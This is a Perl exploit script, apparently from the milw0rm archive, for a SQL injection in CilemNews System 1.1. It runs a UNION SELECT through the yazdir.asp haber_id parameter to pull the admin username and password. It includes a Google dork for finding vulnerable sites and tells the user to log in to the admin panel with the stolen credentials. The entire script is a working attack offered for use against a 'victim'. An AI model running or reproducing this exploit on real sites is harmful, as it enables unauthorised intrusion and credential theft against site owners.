#!/usr/bin/perl
#Method found & Exploit scripted by nukedx
#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Usage: cilem.pl <victim> <directory>
#Original Advisory: http://www.nukedx.com/?viewdoc=10
#googledork [ inurl:yazdir.asp?haber_id= ] 2.140 pages...
use IO::Socket;
if(@ARGV < 2){
print "
+***********************************************************************+
+Welcome to CilemNews System <= 1.1 (yazdir.asp haber_id) SQL-inject xpl+
+                   Usage: cilem.pl <victim> <directory>                +
+                       Example: cilem.pl sux.com /                     +
+                 googledork [ inurl:yazdir.asp?haber_id= ]             +
+                 Method found & Exploit scripted by nukedx             +
+***********************************************************************+
";
exit();
}
#Local variables
$cilemserver = $ARGV[0];
$cilemserver =~ s/(http:\/\/)//eg;
$cilemhost = "http://".$cilemserver;
$port = "80";
$cilemdir = $ARGV[1];
$cilemtar = "yazdir.asp?haber_id=";
$cilemfinal = "admin/giris.asp";
$cilemxp = "1%20union%20select%200,admin,sifre,0,0,0,0,0,0,0,0,0,0,0%20from%20ayarlar%20where%20admin=admin";
$cilemreq = $cilemhost.$cilemdir.$cilemtar.$cilemxp;
#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $cilemserver\n";
$cilem = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$cilemserver", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $cilem "GET $cilemreq\n";
print $cilem "Host: $cilemserver\n";
print $cilem "Accept: */*\n";
print $cilem "Connection: close\n\n";
print "+ Connected!...\n";
while($answer = <$cilem>) {
if ($answer =~ /font-weight:700\">(.*?)<\/b><\/td>/){ 
print "+ Exploit succeed! Getting admin's information.\n";
print "+ ---------------- +\n";
print "+ USERNAME: $1\n";
}
if ($answer =~ /(.*?)<\/font><\/td>/) { 
print "+ PASSWORD: $1\n";
print "+ ---------------- +\n";
print "+ Lets go $cilemhost$cilemdir$cilemfinal and\n+ Login with this information. \n";
print "+**********************************************************************+\n";
exit(); 
}
if ($answer =~ /Internal Server Error/) {
print "+ This version of CilemNews is vulnerable too but default query of SQL-inject doesnt work on it\n";
print "+ So please edit query by manually adding or removing null datas..\n";
print "+**********************************************************************+\n";
exit(); 
}
if ($answer =~ /number of columns/) { 
print "+ This version of CilemNews is vulnerable too but default query of SQL-inject doesnt work on it\n";
print "+ So please edit query by manually adding or removing null datas..\n";
print "+**********************************************************************+\n";
exit(); 
}
}
print "+ Exploit failed :(\n";
print "+**********************************************************************+\n";

# milw0rm.com [2006-03-07]
